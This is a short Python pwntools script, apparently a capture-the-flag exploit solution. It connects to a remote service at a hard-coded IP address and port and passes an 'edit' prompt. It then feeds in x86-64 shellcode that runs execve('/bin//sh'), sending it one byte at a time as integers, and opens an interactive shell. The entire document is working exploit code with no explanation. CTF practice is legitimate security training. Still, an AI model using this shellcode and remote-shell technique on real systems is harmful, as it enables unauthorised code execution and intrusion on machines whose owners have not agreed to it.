from pwn import *
context.log_level = 'debug'
p = remote("103.107.183.244", 9704)
p.sendlineafter(b'edit: \n',b"ba")
a="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#convert a to int arrray 
for i in range(len(a)):
    p.sendlineafter(b': ',str(ord(a[i])).encode())
p.interactive()